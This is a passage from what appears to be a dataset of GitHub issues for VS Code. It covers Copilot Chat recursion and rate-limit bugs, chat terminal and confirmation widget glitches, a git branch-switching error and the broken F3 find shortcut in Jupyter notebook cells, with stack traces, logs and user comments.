on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930)\n    at on.get value [as value] (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:451:6428)\n    at on.executor (/Users/alex/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082801/dist/extension.js:1049:15930) \n```", "issue_labels": ["bug", "important", "verified"], "comments": [{"author": "yaronelh", "body": "The issue still exists\n\n<img width=\"399\" height=\"222\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/47e33f78-e889-43fa-9c77-128102a276af\" />\n\n<img width=\"533\" height=\"207\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/27c5214c-57f0-4ebd-95ac-3cb6343ce675\" />"}, {"author": "alexr00", "body": "This rate limit should reset one hour after you hit it."}, {"author": "mjbvz", "body": "Ugh sorry about that and thank you @alexdima for the revert. I will fix the original commit and update `Lazy` to throw in these cases instead of allowing you to get stuck in recursion "}, {"author": "yaronelh", "body": "Just a heads up, I haven't touched the CoPilot for days before this attempt. So if it hit any rate limit it wasn't from any use I've done. "}, {"author": "thrasher-", "body": "Looks like it's still happening:\n\n```\nIdentifier github.copilot-chat\nVersion 0.31.2025082903\nLast Updated 2025-08-29, 15:51:47\n```\n\n```\n2025-08-29 19:59:30.543 [info] Reading sessions from keychain...\n2025-08-29 19:59:30.543 [info] Got stored sessions!\n2025-08-29 19:59:30.543 [info] Got 2 verified sessions.\n2025-08-29 19:59:30.543 [info] Getting sessions for all scopes...\n2025-08-29 19:59:30.543 [info] Got 2 sessions for ...\n2025-08-29 19:59:30.543 [info] Getting sessions for all scopes...\n2025-08-29 19:59:30.543 [info] Got 2 sessions for ...\n2025-08-29 19:59:30.543 [info] Getting sessions for all scopes...\n2025-08-29 19:59:30.543 [info] Got 2 sessions for ...\n2025-08-29 19:59:30.543 [info] Getting sessions for all scopes...\n2025-08-29 19:59:30.544 [info] Got 2 sessions for ...\n2025-08-29 19:59:30.544 [info] Getting sessions for all scopes...\n2025-08-29 19:59:30.544 [info] Got 2 sessions for ...\n2025-08-29 19:59:30.544 [info] Getting sessions for all scopes...\n2025-08-29 19:59:30.544 [info] Got 2 sessions for ...\n2025-08-29 19:59:30.544 [info] Getting sessions for all scopes...\n2025-08-29 19:59:30.544 [info] Got 2 sessions for ...\n2025-08-29 19:59:30.544 [info] Getting sessions for all scopes...\n2025-08-29 19:59:30.544 [info] Got 2 sessions for ...\n2025-08-29 19:59:30.544 [info] Getting sessions for all scopes...\n2025-08-29 19:59:30.544 [info] Got 2 sessions for ...\n2025-08-29 19:59:30.544 [info] Getting sessions for all scopes...\n2025-08-29 19:59:30.544 [info] Got 2 sessions for ...\n2025-08-29 19:59:30.544 [info] Getting sessions for all scopes...\n2025-08-29 19:59:30.544 [info] Got 2 sessions for ...\n2025-08-29 19:59:30.544 [info] Getting sessions for all scopes...\n2025-08-29 19:59:30.544 [info] Got 2 sessions for ...\n2025-08-29 19:59:30.544 [info] Getting sessions for all scopes...\n2025-08-29 19:59:30.544 [info] Got 2 sessions for ...\n2025-08-29 19:59:30.544 [info] Getting sessions for all scopes...\n2025-08-29 19:59:30.544 [info] Got 2 sessions for ...\n2025-08-29 19:59:30.544 [info] Getting sessions for all scopes...\n2025-08-29 19:59:30.544 [info] Got 2 sessions for ...\n2025-08-29 19:59:30.544 [info] Getting sessions for all scopes...\n2025-08-29 19:59:30.544 [info] Got 2 sessions for ...\n2025-08-29 19:59:33.056 [info] Getting sessions for all scopes...\n2025-08-29 19:59:33.056 [info] Got 2 sessions for ...\n2025-08-29 19:59:33.056 [info] Getting sessions for all scopes...\n2025-08-29 19:59:33.056 [info] Got 2 sessions for ...\n2025-08-29 19:59:33.057 [info] Getting sessions for all scopes...\n2025-08-29 19:59:33.057 [info] Got 2 sessions for ...\n2025-08-29 19:59:33.121 [info] Getting sessions for all scopes...\n2025-08-29 19:59:33.121 [info] Got 2 sessions for ...\n2025-08-29 19:59:33.121 [info] Getting sessions for all scopes...\n2025-08-29 19:59:33.121 [info] Got 2 sessions for ...\n2025-08-29 19:59:33.124 [info] Getting sessions for project,read:org,read:user,repo,user:email,workflow...\n2025-08-29 19:59:33.125 [info] Got 0 sessions for project,read:org,read:user,repo,user:email,workflow...\n2025-08-29 19:59:33.205 [info] Getting sessions for read:user,repo,user:email,workflow...\n2025-08-29 19:59:33.205 [info] Got 1 sessions for read:user,repo,user:email,workflow...\n2025-08-29 19:59:33.236 [info] Getting sessions for read:user,repo,user:email,workflow...\n2025-08-29 19:59:33.237 [info] Got 1 sessions for read:user,repo,user:email,workflow...\n2025-08-29 19:59:33.712 [info] Getting sessions for all scopes...\n2025-08-29 19:59:33.712 [info] Got 2 sessions for ...\n2025-08-29 19:59:33.713 [info] Getting sessions for read:user,repo,user:email,workflow...\n2025-08-29 19:59:33.713 [info] Got 1 sessions for read:user,repo,user:email,workflow...\n2025-08-29 19:59:33.713 [info] Getting sessions for all scopes...\n2025-08-29 19:59:33.713 [info] Got 2 sessions for ...\n2025-08-29 19:59:33.870 [info] fetching: Electron fetch failed with status: 429 \n2025-08-29 19:59:34.045 [info] Getting sessions for all scopes...\n2025-08-29 19:59:34.046 [info] Got 2 sessions for ...\n2025-08-29 19:59:34.111 [info] Getting sessions for read:user,repo,user:email,workflow...\n2025-08-29 19:59:34.112 [info] Got 1 sessions for read:user,repo,user:email,workflow...\n2025-08-29 19:59:34.115 [info] Getting sessions for all scopes...\n2025-08-29 19:59:34.115 [info] Got 2 sessions for ...\n2025-08-29 19:59:34.125 [info] Getting sessions for read:user,repo,user:email,workflow...\n2025-08-29 19:59:34.125 [info] Got 1 sessions for read:user,repo,user:email,workflow...\n2025-08-29 19:59:34.380 [info] Getting sessions for all scopes...\n2025-08-29 19:59:34.380 [info] Got 2 sessions for ...\n2025-08-29 19:59:34.380 [info] Getting sessions for read:user,repo,user:email,workflow...\n2025-08-29 19:59:34.380 [info] Got 1 sessions for read:user,repo,user:email,workflow...\n2025-08-29 19:59:34.400 [info] Getting sessions for all scopes...\n2025-08-29 19:59:34.400 [info] Got 2 sessions for ...\n2025-08-29 19:59:34.425 [info] Getting sessions for all scopes...\n2025-08-29 19:59:34.425 [info] Got 2 sessions for ...\n2025-08-29 19:59:34.425 [info] Getting sessions for read:user,repo,user:email,workflow...\n2025-08-29 19:59:34.426 [info] Got 1 sessions for read:user,repo,user:email,workflow...\n2025-08-29 19:59:34.609 [info] fetching: Node fetch failed with status: 429 Too Many Requests\n2025-08-29 19:59:35.328 [info] fetching: Node http/s failed with status: 429 Too Many Requests\n2025-08-29 19:59:35.475 [info] Getting sessions for all scopes...\n2025-08-29 19:59:35.475 [info] Got 2 sessions for ...\n2025-08-29 19:59:35.475 [info] Getting sessions for all scopes...\n2025-08-29 19:59:35.475 [info] Got 2 sessions for ...\n2025-08-29 19:59:35.485 [info] Getting sessions for read:user,repo,user:email,workflow...\n2025-08-29 19:59:35.485 [info] Got 1 sessions for read:user,repo,user:email,workflow...\n2025-08-29 19:59:35.503 [info] Getting sessions for all scopes...\n2025-08-29 19:59:35.503 [info] Got 2 sessions for ...\n2025-08-29 19:59:35.504 [info] Getting sessions for read:user,repo,user:email,workflow...\n2025-08-29 19:59:35.504 [info] Got 1 sessions for read:user,repo,user:email,workflow...\n2025-08-29 19:59:35.567 [info] Getting sessions for all scopes...\n2025-08-29 19:59:35.567 [info] Got 2 sessions for ...\n2025-08-29 19:59:35.571 [info] Getting sessions for read:user,repo,user:email,workflow...\n2025-08-29 19:59:35.571 [info] Got 1 sessions for read:user,repo,user:email,workflow...\n2025-08-29 19:59:35.574 [info] Getting sessions for all scopes...\n2025-08-29 19:59:35.574 [info] Got 2 sessions for ...\n2025-08-29 19:59:35.575 [info] Getting sessions for all scopes...\n2025-08-29 19:59:35.575 [info] Got 2 sessions for ...\n2025-08-29 19:59:36.432 [info] Getting sessions for all scopes...\n2025-08-29 19:59:36.432 [info] Got 2 sessions for ...\n2025-08-29 19:59:36.433 [info] Getting sessions for read:user,repo,user:email,workflow...\n2025-08-29 19:59:36.433 [info] Got 1 sessions for read:user,repo,user:email,workflow...\n2025-08-29 19:59:37.108 [info] Getting sessions for all scopes...\n2025-08-29 19:59:37.108 [info] Got 2 sessions for ...\n```"}]}
{"repo": "microsoft/vscode", "issue_number": 263886, "issue_url": "https://github.com/microsoft/vscode/issues/263886", "issue_title": "Foreground terminal execution can hang if no `selectedOption` is found", "issue_author": "meganrogge", "issue_body": "Using `claude` seems to do this for me", "issue_labels": ["bug", "important", "*duplicate", "chat-terminal"], "comments": [{"author": "meganrogge", "body": "/duplicate [261266](https://github.com/microsoft/vscode/issues/261266)"}]}
{"repo": "microsoft/vscode", "issue_number": 263888, "issue_url": "https://github.com/microsoft/vscode/issues/263888", "issue_title": "can re-prompt with same question", "issue_author": "meganrogge", "issue_body": "The marker approach does not work since we include the last five lines of output and the prompt can occur within those. cc @Tyriar \n\n<img width=\"1308\" height=\"537\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/c84bd535-3d60-441a-8228-312a8040dceb\" />", "issue_labels": ["bug", "verified", "insiders-released", "chat-terminal"], "comments": [{"author": "meganrogge", "body": "Ask the agent to run a script that asks questions. Verify the question is not repeatedly asked."}]}
{"repo": "microsoft/vscode", "issue_number": 263188, "issue_url": "https://github.com/microsoft/vscode/issues/263188", "issue_title": "Can attach vscode tools in chat session editors", "issue_author": "roblourens", "issue_body": "The tool widget is hidden, but tool references aren't\n\n<img width=\"270\" height=\"158\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/3ccf7e09-ac79-48b6-a2e6-f6421007538b\" />", "issue_labels": ["bug", "verified", "insiders-released", "chat-sessions-view"], "comments": [{"author": "roblourens", "body": "Just open a Claude Code or Coding Agent chat editor. If you type `#` you should not see tool references"}]}
{"repo": "microsoft/vscode", "issue_number": 263449, "issue_url": "https://github.com/microsoft/vscode/issues/263449", "issue_title": "RangeError: Maximum call stack size exceeded in worker2.js", "issue_author": "roblourens", "issue_body": "This was printed many times while using agent mode in a normal way. Led to the EH process being bogged down and slow\n\n<img width=\"1466\" height=\"1340\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/ef0dfadc-e3ba-4c64-ac82-1ec97a263437\" />\n\n```\nlog.ts:460   ERR [Extension Host] RangeError: Maximum call stack size exceeded\n    at O (/Users/roblou/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082602/dist/worker2.js:10:18492)\n    at Object.Wr (/Users/roblou/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082602/dist/worker2.js:664:6911)\n    at async MessagePort.<anonymous> (/Users/roblou/.vscode-insiders/extensions/github.copilot-chat-0.31.2025082602/dist/worker2.js:664:13096)\n```\n\n`O` here is\nhttps://github.com/microsoft/vscode-copilot-chat/blob/36a6526a1ebc429234829cd30607b74e364b9558/src/platform/parser/node/querying.ts#L44\n\nthis can happen when doing a spread with a lot of items. This doesn't look like new code, so I don't know how I triggered the issue", "issue_labels": ["bug", "verified", "author-verification-requested", "tree-sitter"], "comments": [{"author": "ulugbekna", "body": "thank you for reporting and identifying the root cause -- TIL!"}, {"author": "ulugbekna", "body": "@roblourens would appreciate if you could verify (by code review since we don't have a repro, I think)"}]}
{"repo": "microsoft/vscode", "issue_number": 262623, "issue_url": "https://github.com/microsoft/vscode/issues/262623", "issue_title": "Unable to switch branches(command '__vscb5ec3d9f-5a10-4da1-b8a6-7ff01a1306fe' not found)", "issue_author": "yoyo837", "issue_body": "\nType: <b>Bug</b>\n\nThere are no detailed reproduction steps. Click the branch name in the lower left corner and want to switch to another branch. You may be prompted with `command '__vscb5ec3d9f-5a10-4da1-b8a6-7ff01a1306fe' not found`\n\nhttps://github.com/user-attachments/assets/b0a25dff-a30b-4cb7-927e-7b0cbde7104d\n\nVS Code version: Code 1.103.1 (Universal) (360a4e4fd251bfce169a4ddf857c7d25d1ad40da, 2025-08-12T16:25:40.542Z)\nOS version: Darwin arm64 24.6.0\nModes:\n\n<details>\n<summary>System Info</summary>\n\n|Item|Value|\n|---|---|\n|CPUs|Apple M1 Max (10 x 2400)|\n|GPU Status|2d_canvas: enabled<br>direct_rendering_display_compositor: disabled_off_ok<br>gpu_compositing: enabled<br>multiple_raster_threads: enabled_on<br>opengl: enabled_on<br>rasterization: enabled<br>raw_draw: disabled_off_ok<br>skia_graphite: enabled_on<br>trees_in_viz: disabled_off<br>video_decode: enabled<br>video_encode: enabled<br>webgl: enabled<br>webgl2: enabled<br>webgpu: enabled<br>webnn: disabled_off|\n|Load (avg)|7, 7, 5|\n|Memory (System)|32.00GB (1.07GB free)|\n|Process Argv|--crash-reporter-id 2a648fcb-aa9e-4b05-a81e-c6575e1e747e|\n|Screen Reader|no|\n|VM|0%|\n</details><details><summary>Extensions (46)</summary>\n\nExtension|Author (truncated)|Version\n---|---|---\nvite|ant|0.2.5\nastro-vscode|ast|2.15.4\nvscode-tailwindcss|bra|0.14.26\nnpm-intellisense|chr|1.4.5\npath-intellisense|chr|2.10.0\ndart-code|Dar|3.116.0\nflutter|Dar|3.116.0\nvscode-markdownlint|Dav|0.60.0\nvscode-eslint|dba|3.0.16\njavascript-ejs-support|Dig|1.3.3\nxml|Dot|2.5.1\ngitlens|eam|17.3.4\nEditorConfig|Edi|0.17.4\nprettier-vscode|esb|11.0.0\ngit-project-manager|fel|1.8.2\ncode-runner|for|0.12.2\ncopilot|Git|1.350.0\ncopilot-chat|Git|0.30.1\nvscode-github-actions|git|0.27.2\ngo|gol|0.48.0\ntodo-tree|Gru|0.0.226\nvscode-codeowners|jas|1.1.1\nrainbow-csv|mec|3.20.0\nvscode-language-pack-zh-hans|MS-|1.103.2025081309\ndebugpy|ms-|2025.10.0\npython|ms-|2025.12.0\nvscode-pylance|ms-|2025.7.1\nvscode-python-envs|ms-|1.2.0\nremote-containers|ms-|0.422.1\ncmake-tools|ms-|1.21.36\ncpptools|ms-|1.26.3\ncpptools-extension-pack|ms-|1.3.1\nmakefile-tools|ms-|0.12.17\nvsliveshare|ms-|1.0.5959\nvscode-react-native|msj|1.13.0\nbcompare-vscode|Sco|1.0.7\nvscode-stylelint|sty|1.5.3\neven-better-toml|tam|0.21.2\nvscode-mdx|uni|1.8.16\nintellicode-api-usage-examples|Vis|0.2.9\nvscodeintellicode|Vis|1.3.2\nvscode-icons|vsc|12.14.0\nvolar|Vue|3.0.6\nphp-debug|xde|1.37.0\nphp-pack|xde|1.0.3\nphp-intellisense|zob|1.3.3\n\n(1 theme extensions excluded)\n\n</details><details>\n<summary>A/B Experiments</summary>\n\n```\nvsliv368:30146709\nbinariesv615:30325510\nnativeloc1:31344060\ndwcopilot:31170013\ndwoutputs:31242946\ncopilot_t_ci:31333650\ne5gg6876:31282496\npythoneinst12:31285622\n996jf627:31283433\npythonrdcb7:31342333\nusemplatestapi:31297334\n747dc170:31275177\n6518g693:31334701\naj953862:31281341\n9d2cg352:31346308\nnesew2to5:31336538\nagentclaude:31350858\nnes-set-on:31351930\n6abeh943:31336334\nenvsactivate1:31353494\n0927b901:31350571\nf76d9909:31348711\ncustommodelcf:31371783\n0ej4-default:31346761\n45650338:31358607\n0cj2b977:31352657\njusteven_python_cf:31371805\nretryenabled:31370050\n\n```\n\n</details>\n\n<!-- generated by issue reporter -->", "issue_labels": ["bug", "git", "*duplicate"], "comments": [{"author": "yoyo837", "body": "After doing `Developer: Reload Window` fixes it, but it still appears again with unclear timing."}, {"author": "lszomoru", "body": "@yoyo837, are you able to reproduce this issue with the latest VS Code Insiders release (1.104)? Thanks! "}, {"author": "yoyo837", "body": "> [@yoyo837](https://github.com/yoyo837), are you able to reproduce this issue with the latest VS Code Insiders release (1.104)? Thanks!\n\nSure, let me try it."}, {"author": "yoyo837", "body": "This issue still exists in Insider builds.\n\n<img width=\"260\" height=\"371\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/1804d03b-c3c9-43f0-a202-8baa8733bd62\" />\n\n<img width=\"1915\" height=\"1074\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/74ee8de4-e841-421c-8c30-a591aa74f67e\" />\n"}, {"author": "lszomoru", "body": "@yoyo837, are you able to come up with the set of steps that you perform after launching VS Code to repro? Thanks! "}, {"author": "yoyo837", "body": "> [@yoyo837](https://github.com/yoyo837), are you able to come up with the set of steps that you perform after launching VS Code to repro? Thanks!\n\nI haven't found the steps to reproduce the problem yet, it seems to happen suddenly each time. I will continue to observe and try to find a pattern."}, {"author": "lszomoru", "body": "@yoyo837, does this happen when you change branches or maybe you update an extension and restart the extension host? "}, {"author": "yoyo837", "body": "> [@yoyo837](https://github.com/yoyo837), does this happen when you change branches or maybe you update an extension and restart the extension host?\n\nYes, after I waited many days for a new version of any one plugin, it happened after updating the extension and restarting the extension host."}, {"author": "lszomoru", "body": "@yoyo837, what version were you using then you reproduced the issue? \nCan you try to reproduce the issue with the latest VS Code Insiders release?  "}, {"author": "yoyo837", "body": "> what version were you using then you reproduced the issue? \n\nversion: 1.103.2 (Universal)\ncommit: 6f17636121051a53c88d3e605c491d22af2ba755\n\n> Can you try to reproduce the issue with the latest VS Code Insiders release?\n\nOk, I'll try it again with the latest VS Code Insiders release."}, {"author": "lszomoru", "body": "A fix for this issue is currently available in the latest VS Code Insiders release."}, {"author": "yoyo837", "body": "> A fix for this issue is currently available in the latest VS Code Insiders release.\n\nWould you mind linking to the PR or commit that fixed this?"}, {"author": "lszomoru", "body": "Sure - https://github.com/microsoft/vscode/pull/262949"}, {"author": "yoyo837", "body": "I can confirm this is fixed for me on v1.104.0 insider release 4a31639f5f6e1ba6f2521ca73430f3d59eb97524.\n\nAnd this issue is duplicate of https://github.com/microsoft/vscode/issues/259786"}]}
{"repo": "microsoft/vscode", "issue_number": 263255, "issue_url": "https://github.com/microsoft/vscode/issues/263255", "issue_title": "Focus chat confirmation shouldn't show in overflow, keybinding doesn't work on Windows", "issue_author": "Tyriar", "issue_body": "The `...` shouldn't be shown here since it's not important to access via mouse\n\n<img width=\"1242\" height=\"1278\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/4faad719-32fe-4c16-b010-a197030e3318\" />\n\nAlt+something on Windows will be redirected to the menu bar so we can't use that on Windows/Linux either.", "issue_labels": ["bug", "verified", "insiders-released", "chat-tools"], "comments": []}
{"repo": "microsoft/vscode", "issue_number": 263475, "issue_url": "https://github.com/microsoft/vscode/issues/263475", "issue_title": "Confirmation buttons don't hide", "issue_author": "roblourens", "issue_body": "- Show some confirmation\n- Click a button\n- We do `setShowButtons(false)` but the buttons are not hidden\n\nI see this\n\n<img width=\"290\" height=\"333\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/b23b248d-208c-496a-b4f4-ad16b5430323\" />\n\nso `.chat-confirmation-widget-container.hideButtons` so now this rule doesn't match https://github.com/microsoft/vscode/blob/41657f4a050916addf9282a604cb5798fa9cec76/src/vs/workbench/contrib/chat/browser/chatContentParts/media/chatConfirmationWidget.css#L163-L165 and I believe some others \n\nFrom https://github.com/microsoft/vscode/issues/261874, it changed the DOM structure of the widget", "issue_labels": ["bug", "verified", "regression", "insiders-released", "chat"], "comments": []}
{"repo": "microsoft/vscode", "issue_number": 174087, "issue_url": "https://github.com/microsoft/vscode/issues/174087", "issue_title": "F3 shortcut for search and replace within a Jupyter Notebook cell does not work anymore", "issue_author": "lgonzalezsa", "issue_body": "### Applies To\n\n- [X] Notebooks (.ipynb files)\n- [ ] Interactive Window and\\/or Cell Scripts (.py files with \\#%% markers)\n\n### What happened?\n\nBefore 1.75 vscode or jupyter extension v2023.2.1000411022 I was able to press `F3` to find and replace within a cell.\r\nNow `F3` does nothing in the notebook.\r\nI am on Linux OS.\r\n\n\n### VS Code Version\n\n1.75.0\n\n### Jupyter Extension Version\n\nv2023.2.1000411022\n\n### Jupyter logs\n\n```shell\nVisual Studio Code (1.75.0, undefined, desktop)\r\nJupyter Extension Version: 2023.2.1000411022.\r\nPython Extension Version: 2023.2.0.\r\nWorkspace folder /home/gonluisr/PATH\r\nUser belongs to experiment group 'jupyterTest'\r\nUser belongs to experiment group 'jupyterEnhancedDataViewer'\r\ninfo 19:42:35.930: LSP Notebooks experiment is enabled\r\nerror 19:42:36.246: No remote controllers\r\nerror 19:42:36.665: No remote controllers\r\nerror 19:42:36.666: No remote controllers\r\nerror 19:42:37.155: No remote controllers\r\nerror 19:42:37.158: No remote controllers\r\nerror 19:42:37.490: No remote controllers\r\ninfo 19:42:38.757: Checking for server existence.\r\ninfo 19:42:38.758: Connecting to server\r\ninfo 19:42:38.758: Connecting server kernel https://server/user/gonluisr/\r\nConnecting to Jupyter server at https://server/user/gonluisr/\r\ninfo 19:42:38.759: Creating server with url : https://server/user/gonluisr/\r\ninfo 19:42:38.770: Server started.\r\ninfo 19:42:38.770: Creating server with url : https://server/user/gonluisr/\r\ninfo 19:42:38.771: Creating server with url : https://server/user/gonluisr/\r\ninfo 19:42:39.377: Results of switching remote kernel: true\r\ninfo 19:42:41.129: Results of switching remote kernel: false\r\ninfo 19:42:41.129: Results of switching remote kernel: false\r\ninfo 19:42:41.129: Results of switching remote kernel: false\r\ninfo 19:42:45.999: Process Execution: > ~/miniconda3/envs/dev_env/bin/python -m pip list\r\n> ~/miniconda3/envs/dev_env/bin/python -m pip list\n```\n\n\n### Coding Language and Runtime Version\n\n_No response_\n\n### Language Extension Version (if applicable)\n\nPython extension v2023.2.0\n\n### Anaconda Version (if applicable)\n\nconda 22.9.0\n\n### Running Jupyter locally or remotely?\n\nRemote", "issue_labels": ["bug", "notebook-cell-editor", "notebook-find"], "comments": [{"author": "amunger", "body": "The enter key has some strange behavior as well when within the find widget. Doesn't go to the next selection, doesn't trigger a replace.\r\n"}, {"author": "grantsimongrant", "body": "@rebornix\r\nThe find widget for a single cell is not working anymore, nothing happens after pressing the shortcut key, hope it can be resolved soon!\r\nThis is the normal effect.\r\n![find](https://user-images.githubusercontent.com/47892240/220920773-92753cb7-4275-49aa-b456-477dcef96fb1.png)\r\n"}, {"author": "ihgumilar", "body": "Agree !\r\nI miss the super useful feature :(\r\n\r\nThanks"}, {"author": "FRIMENGORDON", "body": "\n\u0422\u0430\u043a \u043f\u043e\u0447\u0435\u043c\u0443 \u043c\u044b \u043c\u0435\u0434\u043b\u0438\u043c?\n--\n\u041e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u043e \u0438\u0437 Mail.ru \u0434\u043b\u044f Android \u0432\u043e\u0441\u043a\u0440\u0435\u0441\u0435\u043d\u044c\u0435, 21 \u043c\u0430\u044f 2023\u0433., 13:18 +03:00 \u043e\u0442 Ihshan Gumilar  ***@***.*** :\n\n>Agree !\n>I miss the super useful feature :(\n>Thanks\n>\u2014\n>Reply to this email directly,  view it on GitHub , or  unsubscribe .\n>You are receiving this because you are subscribed to this thread. Message ID:  @ github . com>"}, {"author": "Freymat", "body": "How to rename a symbol in a single cell of a jupyter notebook, without affecting the other cells ? Would be super usefull."}, {"author": "khlari", "body": "Hi, any update?"}, {"author": "isaacsarver", "body": "Hi, any updates on this issue? Hoping it can be fixed soon"}, {"author": "KangByungwoo", "body": "Please fix this!"}, {"author": "lgonzalezsa", "body": "Definitely I am missing this capability"}, {"author": "allabur", "body": "missing\r\n"}, {"author": "syedjafri3", "body": "someone please look into this "}, {"author": "josephko91", "body": "+1"}, {"author": "Freymat", "body": "+1\r\n\r\nLe mar. 30 avr. 2024 \u00e0 20:13, Joseph Ko ***@***.***> a \u00e9crit :\r\n\r\n> +1\r\n>\r\n> \u2014\r\n> Reply to this email directly, view it on GitHub\r\n> <https://github.com/microsoft/vscode/issues/174087#issuecomment-2086372720>,\r\n> or unsubscribe\r\n> <https://github.com/notifications/unsubscribe-auth/ASSGDN2K42UGZ74PR72DD4DY77NONAVCNFSM6AAAAAAUYD7I4KVHI2DSMVQWIX3LMV43OSLTON2WKQ3PNVWWK3TUHMZDAOBWGM3TENZSGA>\r\n> .\r\n> You are receiving this because you commented.Message ID:\r\n> ***@***.***>\r\n>\r\n"}, {"author": "milanaveed", "body": "+1"}, {"author": "FraNob", "body": "Definitely an important feature! Please give some updates."}, {"author": "godji83", "body": "+1"}, {"author": "collinmccarthy", "body": "This makes using notebooks extremely frustrating.. is there a work around at least? "}, {"author": "collinmccarthy", "body": "My work around is to open the .ipynb file as a text file (see https://stackoverflow.com/a/65566417/12422298) then do my standard search-replace, then save and re-open the file as a notebook and continue working. Much faster than dealing with the UI in its current state. "}, {"author": "FraNob", "body": "It seems that this feature got reintroduced \ud83d\ude04 "}, {"author": "allabur", "body": "Using shortcut CTRL + F2 (_Change all occurrences_) replace, does not replace but positions the cursor at the end of the selected text, within a Jupyter Notebook cell the text you have selected previously."}, {"author": "samuelyhsu", "body": "Version: 1.96.4 (user setup)\nCommit: cd4ee3b1c348a13bafd8f9ad8060705f6d4b9cba\nDate: 2025-01-16T00:16:19.038Z\nElectron: 32.2.6\nElectronBuildId: 10629634\nChromium: 128.0.6613.186\nNode.js: 20.18.1\nV8: 12.8.374.38-electron.0\nOS: Windows_NT x64 10.0.22631\n\nStill not work"}, {"author": "nicouh", "body": "Can confirm, pressing f3 does nothing in Jupyter notebooks. \nAlso, when using regular search and then editing some lines with find-matches in it, the search counter randomly jumps back. E.g. I search for something, find 40 matches, I go to match `#30`, then edit that line, the match counter goes back to 5, so I press \"find next\" and it pushes me back to match `#6`, not match `#31`. \nBoth is so frustrating that I am using other IDEs for Jupyter notebooks.\n\n```\nVersion: 1.98.1 (user setup)\nCommit: 2fc07b811f760549dab9be9d2bedd06c51dfcb9a\nDate: 2025-03-10T15:38:08.854Z\nElectron: 34.2.0\nElectronBuildId: 11160463\nChromium: 132.0.6834.196\nNode.js: 20.18.2\nV8: 13.2.152.36-electron.0\nOS: Windows_NT x64 10.0.19045\n```"}, {"author": "rsxdalv", "body": "F3 does not work, only arrow key buttons work"}, {"author": "rebornix", "body": "Fix via https://github.com/microsoft/vscode/pull/270303"}]}
